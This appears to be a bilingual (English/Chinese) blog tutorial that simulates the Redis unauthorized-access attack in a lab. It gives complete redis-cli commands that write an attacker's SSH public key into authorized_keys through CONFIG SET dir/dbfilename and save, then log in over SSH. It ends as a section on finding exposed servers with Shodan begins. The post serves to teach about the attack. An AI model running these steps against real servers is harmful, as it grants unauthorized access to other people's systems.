<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="redis,å®‰å…¨,">










<meta name="description" content="Redis, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it is designed to be accessed inside trusted environm">
<meta name="keywords" content="redis,å®‰å…¨">
<meta property="og:type" content="article">
<meta property="og:title" content="redis unauthorized access vulnerability simulation(redisæœªç»æˆæƒçš„è®¿é—®æ¼æ´æ¨¡æ‹Ÿ)">
<meta property="og:url" content="http://yoursite.com/ç¿»è¯‘/redis-unauthorized-access-vulnerability-simulation/index.html">
<meta property="og:site_name" content="ç®€æ°çš„ Blog">
<meta property="og:description" content="Redis, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it is designed to be accessed inside trusted environm">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://yoursite.com/img/review/0_UqCMKzd401p_9xgf.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_kj5v1UOnDs4_1B-4.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_RXLExaGb28VkI0xO.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_ly-kkskrTIJ72LFM.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_xTWYFYecso8XJKdI.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_wjEeD2SSdTnymBVT.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_ueth-xQWtxJobzwL.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_C2n27eAOGFkK79IU.png">
<meta property="og:image" content="http://yoursite.com/ç¿»è¯‘/redis-unauthorized-access-vulnerability-simulation/img/0_m19lcFYeFOhB_Nui.png">
<meta property="og:image" content="http://yoursite.com/ç¿»è¯‘/redis-unauthorized-access-vulnerability-simulation/img/0_hxf9oaOFJVDohZMC.png">
<meta property="og:image" content="http://yoursite.com/ç¿»è¯‘/redis-unauthorized-access-vulnerability-simulation/img/0_C4_dcCGWAPWxFbaU.png">
<meta property="og:updated_time" content="2019-08-23T15:15:33.984Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="redis unauthorized access vulnerability simulation(redisæœªç»æˆæƒçš„è®¿é—®æ¼æ´æ¨¡æ‹Ÿ)">
<meta name="twitter:description" content="Redis, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it is designed to be accessed inside trusted environm">
<meta name="twitter:image" content="http://yoursite.com/img/review/0_UqCMKzd401p_9xgf.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/ç¿»è¯‘/redis-unauthorized-access-vulnerability-simulation/">





  <title>redis unauthorized access vulnerability simulation(redisæœªç»æˆæƒçš„è®¿é—®æ¼æ´æ¨¡æ‹Ÿ) | ç®€æ°çš„ Blog</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?3094125d6c6fead2ab23a1ef8b067249";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ç®€æ°çš„ Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">ä¸€èµ·å­¦ä¹ ï¼Œä¸€èµ·è¿›æ­¥</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            åˆ†ç±»
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            æ ‡ç­¾
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            å½’æ¡£
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            å…³äº
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            æœç´¢
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="æœç´¢..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/ç¿»è¯‘/redis-unauthorized-access-vulnerability-simulation/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jani">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/img/12641322.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ç®€æ°çš„ Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">redis unauthorized access vulnerability simulation(redisæœªç»æˆæƒçš„è®¿é—®æ¼æ´æ¨¡æ‹Ÿ)</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-06T20:43:02+08:00">
                2019-04-06
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ç¿»è¯‘/" itemprop="url" rel="index">
                    <span itemprop="name">ç¿»è¯‘</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>Redis, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it is designed to be accessed inside trusted environments, it should not be exposed on the Internet. However, some Redisâ€™ are bind to public interface and even has no password authentication protection.</p>
<p>Redisæ˜¯ä¸€ä¸ªå¼€æºçš„ã€å¹¿æ³›æµè¡Œçš„æ•°æ®ç»“æ„å·¥å…·ï¼Œå¯ä»¥ç”¨ä½œå†…å­˜ä¸­çš„åˆ†å¸ƒå¼æ•°æ®åº“ã€æ¶ˆæ¯ä»£ç†æˆ–ç¼“å­˜ã€‚å› ä¸ºå®ƒè¢«è®¾è®¡ä¸ºåœ¨å—ä¿¡ä»»çš„ç¯å¢ƒä¸­è®¿é—®ï¼Œæ‰€ä»¥ä¸åº”è¯¥åœ¨ Internet ä¸Šå…¬å¼€ã€‚ç„¶è€Œï¼Œä¸€äº› Redis ç»‘å®šåˆ°å…¬å…±æ¥å£ï¼Œç”šè‡³æ²¡æœ‰å¯†ç èº«ä»½éªŒè¯ä¿æŠ¤ã€‚</p>
<p>Under certain conditions, if Redis runs with the root account (or not even), attackers can write an SSH public key file to the root account, directly logging on to the victim server through SSH. This may allow hackers to gain server privileges, delete or steal data, or even lead to an encryption extortion, critically endangering normal business services.</p>
<p>åœ¨æŸäº›æ¡ä»¶ä¸‹ï¼Œå¦‚æœRedisä½¿ç”¨ root å¸æˆ·è¿è¡Œï¼ˆç”šè‡³ä¸ä½¿ç”¨ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥å‘æ ¹å¸æˆ·å†™å…¥ SSH å…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡ SSH ç™»å½•åˆ°å—å®³æœåŠ¡å™¨ã€‚è¿™å¯èƒ½ä½¿é»‘å®¢è·å¾—æœåŠ¡å™¨ç‰¹æƒï¼Œåˆ é™¤æˆ–çªƒå–æ•°æ®ï¼Œç”šè‡³å¯¼è‡´åŠ å¯†å‹’ç´¢ï¼Œä¸¥é‡å±å®³æ­£å¸¸çš„ä¸šåŠ¡æœåŠ¡ã€‚</p>
<p>The simplified flow of this exploit is:</p>
<ul>
<li>Login to a unprotected Redis</li>
<li>Change itâ€™s backup location to .ssh directoryâ€Šâ€”â€ŠWrite the SSH Keys to new backup location</li>
<li>Remote connect and login to the target server using SSH key</li>
</ul>
<p>We should already be familiar how automatic SSH login with private + public keys works.</p>
<p>ç®€åŒ–å®ç°æµç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>ç™»å½•åˆ°ä¸€ä¸ªæ— ä¿æŠ¤çš„ Redis</li>
<li>å°†å¤‡ä»½ä½ç½®æ›´æ”¹ä¸º .ssh ç›®å½• â€”â€” å°†SSHå¯†é’¥å†™å…¥æ–°çš„å¤‡ä»½ä½ç½®</li>
<li>ä½¿ç”¨ SSH å¯†é’¥è¿œç¨‹è¿æ¥å¹¶ç™»å½•åˆ°ç›®æ ‡æœåŠ¡å™¨</li>
</ul>
<p>æˆ‘ä»¬åº”è¯¥å·²ç»ç†Ÿæ‚‰äº†å¦‚ä½•ä½¿ç”¨ç§æœ‰+å…¬é’¥è‡ªåŠ¨ç™»å½• SSHã€‚</p>
<h2 id="Simulation"><a href="#Simulation" class="headerlink" title="Simulation"></a>Simulation</h2><h2 id="æ¨¡æ‹Ÿ"><a href="#æ¨¡æ‹Ÿ" class="headerlink" title="æ¨¡æ‹Ÿ"></a>æ¨¡æ‹Ÿ</h2><p>Now letâ€™s get our feet wet and set up a target machine. Weâ€™ll need two machines, they can be real machines, virtual machines, or remote machines (VPS). As long as the attack end is able to ping the target end, we are good.</p>
<p>ç°åœ¨è®©æˆ‘ä»¬å…ˆæŠŠåšå¥½æ¨¡æ‹Ÿå‰å‡†å¤‡ã€‚æˆ‘ä»¬éœ€è¦ä¸¤å°æœºå™¨ï¼Œå®ƒä»¬å¯ä»¥æ˜¯çœŸæ­£çš„æœºå™¨ã€è™šæ‹Ÿæœºæˆ–è¿œç¨‹æœºå™¨(VPS)ã€‚åªè¦æ”»å‡»ç«¯èƒ½å¤Ÿ ping ç›®æ ‡ç«¯å°±å¯ä»¥äº†ã€‚</p>
<p>Environment setup for this example:</p>
<ul>
<li>Target Machine: Redis-3.2.11 on Ubuntu</li>
<li>Attack Machine: Platform you like with Redis (I used Kali)</li>
</ul>
<p>ç¤ºä¾‹ä¸­çš„ç¯å¢ƒå¦‚ä¸‹ï¼š</p>
<ul>
<li>ç›®æ ‡æœºå™¨ï¼šubuntu ä¸‹æœ‰ Redis-3.2.11</li>
<li>æ”»å‡»æœºå™¨ï¼šä½ å–œæ¬¢çš„å¹³å°ä¸ Redis(æˆ‘ç”¨çš„æ˜¯ Kali)</li>
</ul>
<h3 id="Set-Up-Target-Machine"><a href="#Set-Up-Target-Machine" class="headerlink" title="Set Up Target Machine:"></a>Set Up Target Machine:</h3><h3 id="è®¾å®šç›®æ ‡æœºå™¨ï¼š"><a href="#è®¾å®šç›®æ ‡æœºå™¨ï¼š" class="headerlink" title="è®¾å®šç›®æ ‡æœºå™¨ï¼š"></a>è®¾å®šç›®æ ‡æœºå™¨ï¼š</h3><p>First, let us set up the target machine with Redis. Download source code by</p>
<p>é¦–å…ˆï¼Œè®©æˆ‘ä»¬é…ç½®ç›®æ ‡æœºå™¨çš„ Reidsã€‚ä¸‹è½½æºä»£ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.11.tar.gz</span><br></pre></td></tr></table></figure>
<p>Extract and build</p>
<p>æå–å’Œæ„å»º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar xzf redis-3.2.11.tar.gz cd redis-3.2.11</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>After make, we use our favorite editor to open <code>redis.conf</code> in <code>redis-3.2.11</code> folder. In order to be remotely accessed, we will need to comment out line <code>bind 127.0.0.1</code> and disable <code>protected-mode</code> as shown below.</p>
<p>ç¼–è¯‘åï¼Œæˆ‘ä»¬ä½¿ç”¨æˆ‘ä»¬æœ€å–œæ¬¢çš„ç¼–è¾‘å™¨æ‰“å¼€ <code>redis-3.2.11</code> æ–‡ä»¶å¤¹ çš„ <code>redis.conf</code>ã€‚ä¸ºäº†è¿œç¨‹è®¿é—®ï¼Œæˆ‘ä»¬éœ€è¦æ³¨é‡Šæ‰ <code>bind 127.0.0.1</code> è¡Œï¼Œå¹¶ç¦ç”¨ <code>protected-mode</code>ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<p><img src="/img/review/0_UqCMKzd401p_9xgf.png" alt></p>
<p>Now fire up Redis with the configuration file we just edited. Note that <code>redis-server</code> is in <code>redis-3.2.11/src</code>.</p>
<p>ç°åœ¨ç”¨æˆ‘ä»¬åˆšåˆšç¼–è¾‘çš„é…ç½®æ–‡ä»¶å¯åŠ¨Redisã€‚æ³¨æ„ <code>redis-server</code> åœ¨ <code>redis-3.2.11/src</code> ä¸­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/redis-server redis.conf</span><br></pre></td></tr></table></figure>
<p>So far, we have finished setting up the target server. Additionally, we should also check if we have <code>.ssh</code> folder. If not, we should create it for the attack later.</p>
<p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»å®Œæˆäº†ç›®æ ‡æœåŠ¡å™¨çš„è®¾ç½®ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜åº”è¯¥æ£€æŸ¥æˆ‘ä»¬æ˜¯å¦æœ‰ <code>.ssh</code>çš„æ–‡ä»¶å¤¹ã€‚å¦‚æœæ²¡æœ‰ï¼Œæˆ‘ä»¬åº”è¯¥ä¸ºä»¥åçš„æ”»å‡»åˆ›å»ºå®ƒã€‚</p>
<h3 id="Attack-Machine"><a href="#Attack-Machine" class="headerlink" title="Attack Machine:"></a>Attack Machine:</h3><h3 id="æ”»å‡»æœºå™¨ï¼š"><a href="#æ”»å‡»æœºå™¨ï¼š" class="headerlink" title="æ”»å‡»æœºå™¨ï¼š"></a>æ”»å‡»æœºå™¨ï¼š</h3><p>First, make sure we can ping the target. Then, we will generate a private key and public key for SSHing into the target machine later. Run the following command to generate SSH keys and leave passphrase empty.</p>
<p>é¦–å…ˆï¼Œç¡®ä¿æˆ‘ä»¬èƒ½é”å®šç›®æ ‡ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†ç”Ÿæˆç§é’¥å’Œå…¬é’¥ï¼Œä»¥ä¾¿ç¨åå°†å…¶æ’å…¥ç›®æ ‡æœºå™¨ã€‚è¿è¡Œä»¥ä¸‹å‘½ä»¤ç”ŸæˆSSHå¯†é’¥ï¼Œå¹¶ä¿ç•™å¯†ç ä¸ºç©ºã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p>Next, enter the <code>.ssh</code> folder. If you are root user, enter <code>/.ssh</code>, otherwise <code>~/.ssh</code>, then copy the private key in to <code>temp.txt</code>.</p>
<p>ä¸‹ä¸€æ­¥ï¼Œè¿›å…¥ <code>.ssh</code> ç›®å½•ã€‚å¦‚æœä½ æ˜¯ root ç”¨æˆ·ï¼Œè¿›å…¥ <code>/.ssh</code>ï¼Œå…¶ä»–çš„è¿›å…¥ <code>~/.ssh</code>ã€‚å¤åˆ¶ç§é’¥åˆ° <code>temp.txt</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; temp.txt</span><br></pre></td></tr></table></figure>
<p>Some may be wondering that why do we put two blank lines before and after the public key? We will leave that as a mystery for right now if you donâ€™t know :)</p>
<p>æœ‰äº›äººå¯èƒ½æƒ³çŸ¥é“ï¼Œä¸ºä»€ä¹ˆåœ¨å…¬é’¥ä¹‹å‰å’Œä¹‹åè¦æ”¾ä¸¤è¡Œç©ºç™½?å¦‚æœä½ ä¸çŸ¥é“ï¼Œæˆ‘ä»¬æš‚æ—¶æŠŠå®ƒä½œä¸ºä¸€ä¸ªè°œ :)</p>
<p><img src="/img/review/0_kj5v1UOnDs4_1B-4.png" alt></p>
<p>Good! So far we have generated a pair a keys, we will need to find a way to smuggle the public key to the Redis server (target machine.)</p>
<p>å¥½äº†ï¼åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»ç”Ÿæˆäº†ä¸€å¯¹å¯†é’¥ï¼Œæˆ‘ä»¬å°†éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•å°†å…¬é’¥å·è¿åˆ°RedisæœåŠ¡å™¨(ç›®æ ‡æœºå™¨)ã€‚</p>
<p>We are going to use <code>redis-cli</code>, the Redis command line interface, to send commands to Redis and read the replies sent by the server directly in the terminal.</p>
<p>æˆ‘ä»¬å°†ä½¿ç”¨ <code>redis-cli</code>ï¼Œå³ Redis å‘½ä»¤è¡Œæ¥å£ï¼Œå‘ Redis å‘é€å‘½ä»¤ï¼Œå¹¶ç›´æ¥è¯»å–ç»ˆç«¯æœåŠ¡å™¨å‘é€çš„å“åº”ã€‚</p>
<p>Run the following commands in <code>redis-3.2.11/src</code> folder. (Or depending where we are, we can always specify the path to the files we use)</p>
<p>åœ¨ <code>redis-3.2.11/src</code> æ–‡ä»¶å¤¹ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ã€‚(æˆ–è€…æ ¹æ®æˆ‘ä»¬çš„ä½ç½®ï¼Œæˆ‘ä»¬æ€»æ˜¯å¯ä»¥æŒ‡å®šæˆ‘ä»¬ä½¿ç”¨çš„æ–‡ä»¶çš„è·¯å¾„)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /.ssh/temp.txt | redis-cli -h 203.137.255.255 -x set s-key</span><br></pre></td></tr></table></figure>
<p>Here, letâ€™s take a look at the command. We use <code>-h</code> flag to specify the remote Redis server IP so that <code>redis-cli</code> knows where to connect and send commands. The part after <code>-x</code> is saying that we are setting the key in redis named <code>s-key</code> with the value in <code>temp.txt</code>.</p>
<p>åœ¨è¿™é‡Œï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹å‘½ä»¤ã€‚æˆ‘ä»¬ä½¿ç”¨ <code>-h</code> æ ‡å¿—æ¥æŒ‡å®šè¿œç¨‹ Redis æœåŠ¡å™¨ IPï¼Œä»¥ä¾¿ <code>redis-cli</code> çŸ¥é“åœ¨ä½•å¤„è¿æ¥å’Œå‘é€å‘½ä»¤ã€‚<code>-x</code> åé¢çš„éƒ¨åˆ†è¡¨ç¤ºï¼Œæˆ‘ä»¬æ­£åœ¨è®¾ç½® redis ä¸­çš„é”®åä¸º <code>s-key</code>ï¼Œå…¶å€¼ä½äº <code>temp.txt</code> ä¸­ã€‚</p>
<p><img src="/img/review/0_RXLExaGb28VkI0xO.png" alt></p>
<p>Yea, we have a key with our SSH key sneaked in! Letâ€™s connect to the Redis and play around its configuration. Use <code>redis-cli</code> to connect to the Redis server again.</p>
<p>æ˜¯çš„ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªå¯†é’¥ï¼ŒSSH å¯†é’¥å·å·æºœè¿›æ¥äº†!è®©æˆ‘ä»¬è¿æ¥åˆ°Rediså¹¶ç ”ç©¶å®ƒçš„é…ç½®ã€‚å†æ¬¡ä½¿ç”¨ <code>redis-cli</code> è¿æ¥åˆ° Redis æœåŠ¡å™¨ã€‚</p>
<p><img src="/img/review/0_ly-kkskrTIJ72LFM.png" alt></p>
<p>Looking at the above screenshot, we first verify the value of the key <code>s-key</code> by using the command <code>GET s-key</code>, which is what we want â€“ the public key with two blank lines before and after. Then I tried the command â€œdirâ€ just to see what it says (kidding). What we actually want to do here is to get the value of â€œs-keyâ€ (SSH public key) stored in the <code>.ssh</code> folder so that we can remote SSH login to the target machine whithout having to type the password.</p>
<p>æŸ¥çœ‹ä¸Šé¢çš„å±å¹•æˆªå›¾ï¼Œæˆ‘ä»¬é¦–å…ˆä½¿ç”¨å‘½ä»¤ <code>GET s-key</code> æ¥éªŒè¯é”® <code>s-key</code> çš„å€¼ï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬æƒ³è¦çš„â€”â€”å‰åå„æœ‰ä¸¤è¡Œç©ºç™½çš„å…¬é’¥ã€‚ç„¶åï¼Œæˆ‘å°è¯•å‘½ä»¤ â€œdirâ€ï¼Œåªæ˜¯ä¸ºäº†çœ‹çœ‹å®ƒè¯´äº†ä»€ä¹ˆ(å¼€ç©ç¬‘)ã€‚è¿™é‡Œæˆ‘ä»¬çœŸæ­£æƒ³åšçš„æ˜¯è·å–å­˜å‚¨åœ¨ <code>.ssh</code> æ–‡ä»¶å¤¹ä¸­çš„â€œs-keyâ€(SSHå…¬é’¥)çš„å€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¿œç¨‹sshç™»å½•åˆ°ç›®æ ‡æœºå™¨ï¼Œè€Œä¸éœ€è¦è¾“å…¥å¯†ç ã€‚</p>
<p>Thus, we will do this:</p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬å°†è¿™æ ·åš:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG GET dir # get your redis directory</span><br><span class="line"># In the output of above command &quot;/home/xxxx/redis-3.2.11/src&quot; is the directory where redis server is installed. CONFIG SET dir</span><br><span class="line">/home/xxxx/.ssh # set the backup location to the .ssh folder</span><br><span class="line">(or) CONFIG SET dir /root/.ssh CONFIG SET dbfilename authorized_keys</span><br><span class="line"># lastly we back our data containing our &quot;s-key&quot; key-value pair up in the .ssh folder</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<blockquote>
<p>The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured Source: <a href="https://www.ssh.com/ssh/authorized_keys/" target="_blank" rel="noopener">ssh.com</a><br>The screenshot shown above already demonstrates the steps mentioned here.</p>
</blockquote>
<blockquote>
<p>SSHä¸­çš„ authorized_keys æ–‡ä»¶æŒ‡å®šäº† SSH å¯†é’¥ï¼Œå¯ç”¨äºç™»å½•åˆ°æ–‡ä»¶é…ç½®æºçš„ç”¨æˆ·å¸æˆ·: <a href="https://www.ssh.com/ssh/authorized_keys/" target="_blank" rel="noopener">ssh.com</a><br>ä¸Šé¢çš„æˆªå›¾å·²ç»æ¼”ç¤ºäº†è¿™é‡Œæåˆ°çš„æ­¥éª¤ã€‚</p>
</blockquote>
<h3 id="Harvest-Time"><a href="#Harvest-Time" class="headerlink" title="Harvest Time"></a>Harvest Time</h3><h3 id="ç»“æœæ—¶é—´"><a href="#ç»“æœæ—¶é—´" class="headerlink" title="ç»“æœæ—¶é—´"></a>ç»“æœæ—¶é—´</h3><p>On Attack Machine, try to SSH in the Target Machine using the following command.</p>
<p>åœ¨æ”»å‡»æœºå™¨ä¸Šï¼Œå°è¯•ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤åœ¨ç›®æ ‡æœºå™¨ä¸ŠSSHã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># command: private key username@server IP</span><br><span class="line">ssh -i id_rsa username@203.137.255.255</span><br></pre></td></tr></table></figure>
<p><img src="/img/review/0_xTWYFYecso8XJKdI.png" alt></p>
<p>YAS! As we can see, we have a successful auto-login with SSH keys! Voila, we have now completed the attack simulation. ğŸ˜ƒ</p>
<p>å¥½ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æˆåŠŸåœ°ä½¿ç”¨ SSH å¯†é’¥è‡ªåŠ¨ç™»å½•!ç§ï¼Œæˆ‘ä»¬ç°åœ¨å·²ç»å®Œæˆäº†æ”»å‡»æ¨¡æ‹Ÿã€‚ğŸ˜ƒ</p>
<p>(Smiley face actually means that Iâ€™m finally almost done writing this up ğŸ˜‚)</p>
<p>(ç¬‘è„¸å®é™…ä¸Šæ„å‘³ç€æˆ‘å·®ä¸å¤šå†™å®Œäº†ğŸ˜‚)</p>
<p>At the end of this section, I would like to show what is Redisâ€™s backup file look like.</p>
<p>åœ¨æœ¬èŠ‚çš„æœ€åï¼Œæˆ‘æƒ³å±•ç¤ºä¸€ä¸‹ä»€ä¹ˆæ˜¯ Redis çš„å¤‡ä»½æ–‡ä»¶ã€‚</p>
<p><img src="/img/review/0_wjEeD2SSdTnymBVT.png" alt></p>
<p>Notice the unreadable characters? Add â€œ\n\nâ€ before and after the key content was just to be safe and separate it from other â€œstuffâ€ so that it can be parsed correctly. ğŸ‘Œ</p>
<p>æ³¨æ„åˆ°è¿™äº›ä¸å¯è¯»çš„å­—ç¬¦äº†å—?åœ¨å…³é”®å†…å®¹ä¹‹å‰å’Œä¹‹åæ·»åŠ â€œ\n\nâ€åªæ˜¯ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå¹¶å°†å…¶ä¸å…¶ä»–â€œå†…å®¹â€åˆ†å¼€ï¼Œä»¥ä¾¿æ­£ç¡®è§£æã€‚</p>
<h2 id="Use-Search-Engine-to-find-Vulnerable-Redis-Servers"><a href="#Use-Search-Engine-to-find-Vulnerable-Redis-Servers" class="headerlink" title="Use Search Engine to find Vulnerable Redis Servers"></a>Use Search Engine to find Vulnerable Redis Servers</h2><h2 id="ä½¿ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„RedisæœåŠ¡å™¨"><a href="#ä½¿ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„RedisæœåŠ¡å™¨" class="headerlink" title="ä½¿ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„RedisæœåŠ¡å™¨"></a>ä½¿ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„RedisæœåŠ¡å™¨</h2><p>Alrighty, as I mentioned, we are going to use <a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a> to search servers that has Redis footprint (characteristics).</p>
